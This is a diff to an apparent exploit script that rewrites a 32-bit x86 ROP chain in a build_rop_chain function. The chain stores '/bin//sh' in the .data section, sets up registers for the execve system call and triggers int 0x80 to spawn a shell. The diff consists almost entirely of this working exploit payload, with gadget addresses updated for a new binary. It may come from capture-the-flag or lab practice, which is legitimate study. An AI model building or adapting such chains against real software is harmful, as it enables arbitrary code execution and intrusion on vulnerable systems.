@@ -9,34 +9,35 @@ DEADBEEF = 0xdeadbeef
 
 
 def build_rop_chain():
-    rop_chain = ''
 
-    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
-    rop_chain += pack('<I', 0x080ed000)  # @ .data
-    rop_chain += pack('<I', 0x080bd226)  # pop eax ; ret
+    rop_chain = ""
+
+    rop_chain += pack(0x0806f22a)  # pop edx ; ret
+    rop_chain += pack(0x080ec060)  # @ .data
+    rop_chain += pack(0x080bc506)  # pop eax ; ret
     rop_chain += '/bin'
-    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
-    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
-    rop_chain += pack('<I', 0x080ed004)  # @ .data + 4
-    rop_chain += pack('<I', 0x080bd226)  # pop eax ; ret
+    rop_chain += pack(0x080a2cfd)  # mov dword ptr [edx], eax ; ret
+    rop_chain += pack(0x0806f22a)  # pop edx ; ret
+    rop_chain += pack(0x080ec064)  # @ .data + 4
+    rop_chain += pack(0x080bc506)  # pop eax ; ret
     rop_chain += '//sh'
-    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
-    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
-    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
-    rop_chain += pack('<I', 0x08055b40)  # xor eax, eax ; ret
-    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
-    rop_chain += pack('<I', 0x080481c9)  # pop ebx ; ret
-    rop_chain += pack('<I', 0x080ed000)  # @ .data
-    rop_chain += pack('<I', 0x080e76ad)  # pop ecx ; ret
-    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
-    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
-    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
-    rop_chain += pack('<I', 0x08055b40)  # xor eax, eax ; ret
-    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
-    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
-    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
-    rop_chain += pack('<I', 0x08098e17)  # add eax, 2 ; ret
-    rop_chain += pack('<I', 0x08048ef6)  # int 0x80
+    rop_chain += pack(0x080a2cfd)  # mov dword ptr [edx], eax ; ret
+    rop_chain += pack(0x0806f22a)  # pop edx ; ret
+    rop_chain += pack(0x080ec068)  # @ .data + 8
+    rop_chain += pack(0x08054ab0)  # xor eax, eax ; ret
+    rop_chain += pack(0x080a2cfd)  # mov dword ptr [edx], eax ; ret
+    rop_chain += pack(0x080481c9)  # pop ebx ; ret
+    rop_chain += pack(0x080ec060)  # @ .data
+    rop_chain += pack(0x080e71c5)  # pop ecx ; ret
+    rop_chain += pack(0x080ec068)  # @ .data + 8
+    rop_chain += pack(0x0806f22a)  # pop edx ; ret
+    rop_chain += pack(0x080ec068)  # @ .data + 8
+    rop_chain += pack(0x08054ab0)  # xor eax, eax ; ret
+    rop_chain += pack(0x080980f0)  # add eax, 3; ret
+    rop_chain += pack(0x080980f0)  # add eax, 3; ret
+    rop_chain += pack(0x080980f0)  # add eax, 3; ret
+    rop_chain += pack(0x080980d7)  # add eax, 2; ret
+    rop_chain += pack(0x08048ef6)  # int 0x80
 
     return rop_chain
 
